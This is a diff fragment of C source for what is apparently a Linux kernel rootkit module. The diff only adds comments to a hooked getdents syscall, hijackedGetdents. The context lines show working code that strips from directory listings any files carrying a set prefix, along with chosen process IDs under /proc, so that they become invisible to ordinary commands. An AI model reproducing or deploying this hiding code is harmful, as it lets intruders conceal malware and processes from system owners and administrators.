@@ -320,8 +320,8 @@ asmlinkage long hijackedGetdents(unsigned int fd, struct linux_dirent *dirp, uns
         goto exit;
     }
 
-    //define d_inode
-    //4.x kernal so we use the following
+    //define d_inode,
+    //4.x kernal so we use the following to define it
     d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
     if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev))
     {
@@ -334,9 +334,11 @@ asmlinkage long hijackedGetdents(unsigned int fd, struct linux_dirent *dirp, uns
         //we actually hide by deleting the dirent and shifting the other dirents to cover
         //this will render our target files and the given pid invis to any command that utilizes getdents
         directory = (void *)ourDirp + offset;
+        //check for the target prefix
         if ((!proc && (memcmp(INCOGNITO_PREFIX, directory->d_name, strlen(INCOGNITO_PREFIX)) == 0))
         || (proc && isIncognito(simple_strtoul(directory->d_name, NULL, 10)))) {
             if (directory == ourDirp){
+              //get dents and modify the dirent struct
                 getdents = getdents - directory->d_reclen;
                 memmove(directory, (void *)directory + directory->d_reclen, getdents);
                 continue;
